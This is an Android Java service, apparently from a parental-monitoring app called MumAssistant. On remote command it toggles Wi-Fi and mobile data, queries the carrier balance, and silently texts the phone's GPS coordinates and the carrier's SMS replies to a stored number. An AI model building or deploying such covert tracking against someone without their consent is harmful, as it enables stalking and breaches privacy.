package com.android.mumassistant.control;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import com.android.mumassistant.R;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

import android.app.AlertDialog;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;

public class snifferService extends Service{
	
	private static final String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final String wifi_tag = "wifi_";
	private final String data_tag = "data_";
	private final String payment_tag = "payment_";
	private final String location_tag = "location_";
	private boolean wifi_value; 
	private boolean data_value;
	private boolean payment_value;
	private boolean locationt_value;
	private String operator_current = "";
	private LocationClient locationClient = null;


	double latitude = 0;
	double longitude = 0;

	

	String bindaddress = null;

	private location_thread locationthread = new location_thread();
	
	private class location_thread extends Thread{
		SmsManager smsManager;
		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();
			Log.v("zjm","zjm location thread run");
			locationClient.start();
			locationClient.requestLocation();

			while((latitude == 0)&&(longitude == 0)){
				try {
					sleep(2000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
				if((latitude != 0)&&(longitude != 0)){
					String message = "**XY#"+"lat_"+latitude+"#"+"lon_"+longitude;
					if((!("0000").equals(bindaddress))&&(null != message)){
						smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(bindaddress, null, message, null, null);
					}
					
					locationClient.stop();
				}
			}
	}
	
	private BroadcastReceiver paymentlistener = new BroadcastReceiver() {

		@Override
		public void onReceive(Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
			if("android.provider.Telephony.SMS_RECEIVED".equals(arg1.getAction())){
				Object[] pdus = (Object[]) arg1.getExtras().get("pdus");
				for (Object pdu : pdus) {
					SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
					String address = message.getOriginatingAddress();
					String content = message.getMessageBody();
					if(operator_current.equals(address) ){
						SmsManager smsManager;
						SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
						String bindaddress = shp.getString("number_edit", "0000");
						smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(bindaddress, null, content, null, null);
					
					}
				}
			}
		}
	};
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		if(intent == null){
			return 0;
		}
		SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		bindaddress = shp.getString("number_edit", "0000");
		
		Bundle myBundel=intent.getExtras();

		String message = myBundel.getString("Message");
		
		
		if(null != message){
			String[] ss = message.split("#");
			for (int i = 0; i < ss.length; i++) {
				if(ss[i].indexOf(wifi_tag) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						wifi_value = true;
					}else{
						wifi_value = false;
					}
					
				}
				if(ss[i].indexOf(data_tag) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						data_value = true;
					}else{
						data_value = false;
					}
					
				}
				if(ss[i].indexOf(payment_tag) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						payment_value = true;
					}else{
						payment_value = false;
					}
				}
				if(ss[i].indexOf(location_tag) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						locationt_value = true;
					}else{
						locationt_value = false;
					}
				}
			}
			
			setMobileDataStatus(getApplicationContext(),data_value);
			setWifi(wifi_value);
			SendPaymentOfQueryMessage(payment_value);
			getLocation(locationt_value);
			//this.stopSelf();
		}
		return super.onStartCommand(intent, flags, startId);
	}
	
	
	private void setMobileDataStatus(Context context, boolean enabled){
		ConnectivityManager conMgr = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE); 
	
		// ConnectivityManager类  
		Class<?> conMgrClass = null;
		// ConnectivityManager类中的字段
		Field iConMgrField = null;
		// IConnectivityManager类的引用
		Object iConMgr = null;
		// IConnectivityManager类
		Class<?> iConMgrClass = null;
		// setMobileDataEnabled方法
		Method setMobileDataEnabledMethod = null;
		
		
		 try {  
             // 取得ConnectivityManager类  
             conMgrClass = Class.forName(conMgr.getClass().getName());  
             // 取得ConnectivityManager类中的对象Mservice  
             iConMgrField = conMgrClass.getDeclaredField("mService");  
             // 设置mService可访问  
             iConMgrField.setAccessible(true);  
             // 取得mService的实例化类IConnectivityManager  
             iConMgr = iConMgrField.get(conMgr);  
             // 取得IConnectivityManager类  
             iConMgrClass = Class.forName(iConMgr.getClass().getName());  
             // 取得IConnectivityManager类中的setMobileDataEnabled(boolean)方法  
             setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod(  
                     "setMobileDataEnabled", Boolean.TYPE);  
             // 设置setMobileDataEnabled方法是否可访问  
             setMobileDataEnabledMethod.setAccessible(true);  
             // 调用setMobileDataEnabled方法  
             setMobileDataEnabledMethod.invoke(iConMgr, enabled);  
       } catch (ClassNotFoundException e) {  
             e.printStackTrace();  
       } catch (NoSuchFieldException e) {  
            e.printStackTrace();  
       } catch (SecurityException e) {  
            e.printStackTrace();  
       } catch (NoSuchMethodException e) {  
             e.printStackTrace();  
       } catch (IllegalArgumentException e) {  
             e.printStackTrace();  
       } catch (IllegalAccessException e) {  
            e.printStackTrace();  
       } catch (InvocationTargetException e) {  
            e.printStackTrace();  
       }  

	}
	
	private void setWifi(boolean isEnable) {
		WifiManager mWm = (WifiManager) this.getSystemService(Context.WIFI_SERVICE); 
		if (isEnable) {
			if (!mWm.isWifiEnabled()) { 
				mWm.setWifiEnabled(true);
			}
		}else{
			 if (mWm.isWifiEnabled()) {
				 mWm.setWifiEnabled(false);
			 }
		}
	}
	
	private void SendPaymentOfQueryMessage(boolean isEnable){
		if(isEnable == false){
			return;
		}
			
		SmsManager smsManager = SmsManager.getDefault();
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = telManager.getSubscriberId();
		String message = "YE" ;
		
		if(imsi!=null){
			if(imsi.startsWith("46000") || imsi.startsWith("46002")){
				//移动
				operator_current = "10086";

			}else if(imsi.startsWith("46001")){
				//联通
				operator_current = "10010";

			}else if(imsi.startsWith("46003")){
				//电信
				operator_current = "10001";

			}
		}
		if((operator_current.length() > 0)&&(message.length() > 0)){
			smsManager.sendTextMessage(operator_current, null, message , null, null);
			 IntentFilter filter = new IntentFilter();
			 filter.addAction(SMS_ACTION);
			 this.registerReceiver(paymentlistener, filter);
		}
	}
	private void getLocation(boolean Enabled){
		Log.v("zjm","zjm location yes");
		if(Enabled == false){
			return ;
		}
		locationClient = new LocationClient(getApplicationContext());
		LocationClientOption option = new LocationClientOption();
		option.setOpenGps(true);
		option.setCoorType("bd09ll");
		option.setPriority(LocationClientOption.NetWorkFirst);
		option.setProdName("MumAssistant");
		option.setScanSpan(5000);
		option.setServiceName("com.baidu.location.service");
		locationClient.setLocOption(option);

		locationClient.registerLocationListener(new BDLocationListener() {
			

			@Override
			public void onReceiveLocation(BDLocation location) {
				// TODO Auto-generated method stub
				if (location == null) {
					Log.v("zjm","zjm BD location null");
					return;
				}
				latitude = location.getLatitude();
				longitude = location.getLongitude();
				
				
				Log.v("zjm","zjm latitude longitude:"+latitude+longitude);

			}

			@Override
			public void onReceivePoi(BDLocation arg0) {
				// TODO Auto-generated method stub
				
			}
		
		});

		locationthread.start();
		
	}
	private void locationDialog(){
		AlertDialog.Builder builder = new AlertDialog.Builder(this);
		builder.setMessage(R.string.locationmessage)
		.setNegativeButton("yes", new DialogInterface.OnClickListener(){

			@Override
			public void onClick(DialogInterface arg0, int arg1) {
				// TODO Auto-generated method stub
				 Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
				 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				 startActivity(intent);
				 locationthread.start();
				 arg0.dismiss();
			}
			
		}).setPositiveButton("no", new OnClickListener(){

			@Override
			public void onClick(DialogInterface arg0, int arg1) {
				// TODO Auto-generated method stub
				arg0.dismiss();
			}
			
		});
		AlertDialog ad = builder.create();
		ad.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		ad.setCanceledOnTouchOutside(false); 
		ad.show(); 
	}
	

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		try{
			this.unregisterReceiver(paymentlistener);
		}catch(Exception e){
			
		}
		if((locationClient != null)&&(locationClient.isStarted())){
			locationClient.stop();
		}
	}

	
}